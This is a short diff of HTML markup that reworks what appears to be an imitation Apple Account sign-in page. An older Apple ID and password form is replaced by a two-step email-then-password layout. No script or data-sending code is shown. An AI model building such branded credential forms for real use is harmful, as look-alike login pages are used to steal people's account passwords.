@@ -24,28 +24,17 @@
             <button id="start-signin" class="btn-blue">Sign In</button>
         </div>
 
-        <div class="login-form-container">
-    <form id="apple-auth-form" method="POST" action="">
-        
-        <div class="input-wrapper">
-            <input type="text" name="email" id="account_name" placeholder="Apple ID" required>
-        </div>
+        <div id="login-section" class="hidden">
+            <h1 class="login-header">Apple Account</h1>
+            <p class="login-sub">Manage your Apple Account</p>
 
-        <div class="input-wrapper">
-            <input type="password" name="password" id="password" placeholder="Password" required>
-        </div>
-
-        <button type="submit" id="sign-in-btn" class="submit-button">
-            <i class="arrow-icon"></i>
-        </button>
-
-        <div class="form-footer">
-            <label class="remember-me">
-                <input type="checkbox" name="remember"> Keep me signed in
-            </label>
-        </div>
-    </form>
-</div>
+            <form id="loginForm">
+                <div class="input-wrapper">
+                    <input type="email" id="email" placeholder="Email or Phone Number" required>
+                    <div id="password-section" class="field-collapsed">
+                        <input type="password" id="password" placeholder="Password">
+                    </div>
+                </div>
 
                 <div class="options-row">
     <div class="remember-container">
